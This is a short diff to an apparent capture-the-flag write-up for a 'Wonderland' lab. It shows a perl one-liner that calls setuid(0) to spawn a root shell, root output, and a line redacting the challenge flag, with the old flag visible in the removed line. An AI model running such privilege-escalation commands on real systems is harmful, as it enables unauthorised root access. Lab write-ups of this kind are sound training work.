@@ -518,7 +518,7 @@ hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin
 uid=0(root) gid=1003(hatter) groups=1003(hatter)
 
 # cat /home/alice/root.txt
-thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
+<<HIDDEN>>
 ```
 
 All done. See you next time.
